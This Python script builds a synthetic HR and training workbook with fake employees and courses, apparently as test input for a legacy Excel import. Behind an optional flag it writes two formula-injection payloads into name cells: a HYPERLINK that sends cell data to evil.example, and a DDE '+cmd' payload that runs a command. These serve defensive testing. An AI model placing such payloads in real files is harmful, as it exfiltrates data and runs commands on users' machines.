"""SYNTHETIC legacy-workbook / IDP export generator (no real data). Same sheet/column layout as the legacy file."""
import sys, datetime as dt
sys.path.insert(0, "/home/user/training/backend")
from openpyxl import Workbook
from app.integrations.excel.gateway import LEGACY_IFS_COLS, LEGACY_IDP_COLS, LEGACY_RECORD_COLS, LEGACY_CHISTORY_COLS

def row(cols, **kw):
    r = [""] * len(cols)
    for k, v in kw.items():
        r[cols.index(k.replace("_", " ") if k.replace("_", " ") in cols else k)] = v
    return r

def build(path, n_emp=30, n_idp=40, edge=True, formula_names=False):
    wb = Workbook(); wb.remove(wb.active)
    ws = wb.create_sheet("IFS"); ws.append(LEGACY_IFS_COLS)
    for i in range(1, n_emp + 1):
        c = LEGACY_IFS_COLS
        r = [""] * len(c)
        def put(col, v): r[c.index(col)] = v
        put("Emp No", f"{9000000 + i}"); put("Employee Status", "Active" if i % 11 else "Terminate")
        put("Fname", f"Synth{i}"); put("Lname", f"Person{i}"); put("Gender", "Male" if i % 2 else "Female")
        put("Mobile", f"99{i:08d}"); put("Email", f"synth{i}@example.test"); put("Farsi First Name", "علی"); put("Farsi Last Name", f"نمونه{i}")
        put("Sup Emp No", f"{9000000 + (i % 5) + 1}" if i > 5 else ""); put("National Code", f"999{i:07d}"); put("Division", f"Div{i % 4}")
        put("Cost Center", f"CC{i % 3}"); put("Organization Name", f"Div{i % 4}"); put("Org Code", "100")
        ws.append(r)
    if edge:
        # unusual rows
        c = LEGACY_IFS_COLS; r = [""] * len(c)
        r[c.index("Emp No")] = "۹۱۰۰۰۰۱"          # Persian digits
        r[c.index("Fname")] = "عليرضا"              # Arabic yeh
        r[c.index("Lname")] = "كريمي" + "‌" + "نژاد"   # Arabic kaf + ZWNJ
        r[c.index("Email")] = "PERSIAN@EXAMPLE.TEST"
        ws.append(r)
        ws.append([])  # blank row
        r = [""] * len(c); r[c.index("Emp No")] = "9000001"; r[c.index("Fname")] = "Dup"; r[c.index("Lname")] = "Emp"; ws.append(r)  # duplicate emp no
        r = [""] * len(c); r[c.index("Emp No")] = "9200000"; r[c.index("Fname")] = "L" * 300; r[c.index("Lname")] = "N" * 300; ws.append(r)  # long names
        if formula_names:
            r = [""] * len(c); r[c.index("Emp No")] = "9300000"; r[c.index("Fname")] = '=HYPERLINK("http://evil.example/?x="&A1,"click")'; r[c.index("Lname")] = "+cmd|' /C calc'!A0"; ws.append(r)
    ws = wb.create_sheet("IDP")
    for _ in range(3): ws.append([])
    ws.append(LEGACY_IDP_COLS); ws.append(LEGACY_IDP_COLS)
    base = dt.date(2026, 10, 10)
    courses = ["Effective Communication", "Leadership Basics", "Time Management"]
    for i in range(1, n_idp + 1):
        emp = 9000000 + ((i - 1) % n_emp) + 1
        ws.append([str(emp), f"Synth Person [ MTNIrancell - Div{i%4} ]", "L3", f"Div{i%4}", courses[i % 3], "Online" if i % 2 else "In-person",
                   "Approved", "Skill", "Soft Skill" if i % 3 else "Technical", "-", (base + dt.timedelta(days=i % 30)).strftime("%Y-%m-%d"),
                   (base + dt.timedelta(days=(i % 30) + 2)).strftime("%Y-%m-%d"), f"LMS-{100000 + i}", "-"])
    if edge:
        ws.append([])   # blank
        ws.append(["۹۰۰۰۰۰۱", "P", "", "", "Effective Communication", "", "Approved", "", "Soft Skill", "-", "2026-10-12", "2026-10-13", "lms ۱۰۰۰۰۱", "-"])  # persian digits, dup of LMS-100001?
        ws.append(["9000002", "P", "", "", "Effective Communication", "", "Approved", "", "Soft Skill", "-", "2026-10-12", "2026-10-13", "LMS-100001", "-"])  # same ticket other emp
        ws.append(["9000003", "P", "", "", "Leadership Basics", "", "Terminate", "", "Soft Skill", "-", "not-a-date", "", "LMS-200001", "MTC-77"])
        ws.append(["8888888", "Unknown", "", "", "Effective Communication", "", "Approved", "", "Soft Skill", "-", "2026-10-12", "2026-10-13", "LMS-300001", "-"])  # unknown employee
        ws.append(["", "", "", "", "", "", "", "", "", "", "", "", "", ""])
        ws.append(["9000004", "P", "", "", "", "", "", "", "", "", "", "", "LMS-400001", ""])   # blank summary
    ws = wb.create_sheet("CHistory")
    ws.append([]); ws.append([]); ws.append(LEGACY_CHISTORY_COLS); ws.append(LEGACY_CHISTORY_COLS)
    for i in range(3):
        r = [""] * len(LEGACY_CHISTORY_COLS); c = LEGACY_CHISTORY_COLS
        r[c.index("Course Name")] = courses[i]; r[c.index("Type")] = "In-Person"; r[c.index("Institute")] = "Synthetic Academy"
        r[c.index("Duration")] = 16; r[c.index("start Date")] = f"2026/1{i}/05"; r[c.index("End Date")] = f"2026/1{i}/06"; r[c.index("Amount")] = 30000000
        ws.append(r)
    ws = wb.create_sheet("Record")
    ws.append([]); ws.append([]); ws.append(LEGACY_RECORD_COLS); ws.append(LEGACY_RECORD_COLS)
    for i in range(1, 6):
        r = [""] * len(LEGACY_RECORD_COLS); c = LEGACY_RECORD_COLS
        r[c.index("Employee Id")] = str(9000000 + i); r[c.index("Ticket")] = f"LMS-{100000+i}"; r[c.index("Course Name")] = courses[i % 3]
        r[c.index("Institute")] = "Synthetic Academy"; r[c.index("start Date")] = f"2026/10/05"; r[c.index("Motivation")] = "Yes" if i % 2 else ""
        ws.append(r)
    wb.save(path)

def build_idp_only(path, n=50):
    wb = Workbook(); ws = wb.active; ws.title = "IDP"
    for _ in range(4): ws.append([])
    ws.append(LEGACY_IDP_COLS)
    for i in range(n):
        ws.append([str(9000001 + i % 30), "Synth [ MTNIrancell - D ]", "", "D", "Effective Communication", "", "Approved", "", "Soft Skill", "-", "2026-11-01", "2026-11-02", f"LMS-{500000+i}", "-"])
    wb.save(path)

if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "/tmp/qa/synth_legacy.xlsx")
